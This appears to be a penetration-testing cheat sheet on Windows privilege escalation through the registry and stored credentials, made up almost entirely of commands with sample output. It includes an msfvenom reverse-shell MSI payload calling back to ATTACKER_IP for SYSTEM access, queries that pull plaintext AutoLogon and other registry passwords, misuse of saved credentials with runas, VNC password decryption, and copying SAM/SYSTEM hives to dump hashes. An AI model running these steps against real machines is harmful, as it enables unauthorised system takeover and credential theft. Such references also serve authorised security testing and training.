# REGISTRY & AUTOLOGON

### AlwaysInstallElevated

Both must be 1 — Install MSI as SYSTEM

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

<details>
<summary>Example Output</summary>

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  AlwaysInstallElevated  REG_DWORD  0x1

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  AlwaysInstallElevated  REG_DWORD  0x1

BOTH must be 1 to exploit!
(If only one = not vulnerable)
```
</details>

---

### Exploit AlwaysInstallElevated

Generate malicious MSI — Runs as SYSTEM

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o shell.msi
msiexec /quiet /qn /i C:\temp\shell.msi
```

<details>
<summary>Example Output</summary>

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f msi -o shell.msi

Transfer to target:
msiexec /quiet /qn /i C:\temp\shell.msi

Attacker nc -nlvp 443:
C:\Windows\system32> whoami
nt authority\system
(MSI installs as SYSTEM when both keys = 1)
```
</details>

---

### AutoLogon credentials

Stored plaintext credentials — Auto-login configured

```bash
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultUserName
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultPassword
```

<details>
<summary>Example Output</summary>

```
reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
  DefaultUserName    REG_SZ  administrator
  DefaultPassword    REG_SZ  Admin@123!
(Plaintext admin credentials in registry)
```
</details>

---

### Saved credentials

Cached credentials — Run commands as stored user

```bash
cmdkey /list
runas /savecred /user:admin cmd.exe
```

<details>
<summary>Example Output</summary>

```
cmdkey /list
  Target: Domain:interactive=CORP\administrator
  Type: Domain Password
  User: CORP\administrator

runas /savecred /user:CORP\administrator cmd.exe
C:\> whoami
corp\administrator
```
</details>

---

### Registry password search

Search registry for passwords — VNC, PuTTY, other apps store creds

```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

<details>
<summary>Example Output</summary>

```
reg query HKLM /f password /t REG_SZ /s
HKLM\SOFTWARE\VNC\Password  REG_SZ  5A003B2F...

VNC password decrypt:
vncpwd.exe 5A003B2F...
Result: s3cr3t!
(VNC and other apps store creds in registry)
```
</details>

---

### SAM/SYSTEM backup files

Backup registry hives — Extract hashes offline

```bash
dir C:\Windows\Repair\SAM
dir C:\Windows\System32\config\RegBack\
```

<details>
<summary>Example Output</summary>

```
dir C:\Windows\Repair\SAM
01/15/2020  SAM
01/15/2020  SYSTEM

copy C:\Windows\Repair\SAM C:\temp\
copy C:\Windows\Repair\SYSTEM C:\temp\

impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Administrator:500:aad3b...:31d6cfe...
```
</details>

---
